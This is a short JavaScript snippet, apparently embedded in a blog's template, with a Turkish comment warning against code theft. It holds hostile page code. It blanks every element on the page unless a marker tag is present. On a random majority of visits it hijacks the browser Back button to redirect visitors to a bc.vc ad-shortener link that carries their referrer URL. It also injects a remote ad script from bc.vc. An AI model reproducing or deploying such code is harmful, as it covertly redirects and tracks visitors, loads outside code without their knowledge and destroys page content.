/* if(document.domain == 'kodperest.blogspot.com'){alert('UYARI: Emek hırsızlığı kötü sonuçlar doğurabilir.');location.href='http://www.koddostu.com';} */
window.onload=function(){var a=document;if(0==a.getElementsByTagName("KODDOSTU").length)for(var a=a.getElementsByTagName("*"),b=0,c=a.length;c>b;b++)a[b].innerHTML="";};
var ua124rt = navigator.userAgent.toLowerCase();
var odgau = Math.floor((Math.random() * 10) + 1);
if(odgau > 3) {
(function(window, location) {
var tybn = document.referrer;
  if(tybn.length >= 8){
  tybn = 'http://bc.vc/13466/' + tybn;
  }
  else{tybn = 'http://bc.vc/ehX7Wj';}
	history.replaceState(null, document.title, location.pathname+"#!/s");
	history.pushState(null, document.title, location.pathname);

	window.addEventListener("popstate", function() {
	  if(location.hash === "#!/s") {
		history.replaceState(null, document.title, location.pathname);
		setTimeout(function(){
		  location.replace(tybn);
		},0);
	  }
	}, false);
}(window, location));
var accountID = 13466;var adType = 'int';var bw = document.createElement('script');bw.src = "http://bc.vc/js/link-converter.js";document.getElementsByTagName('head')[0].appendChild(bw);
}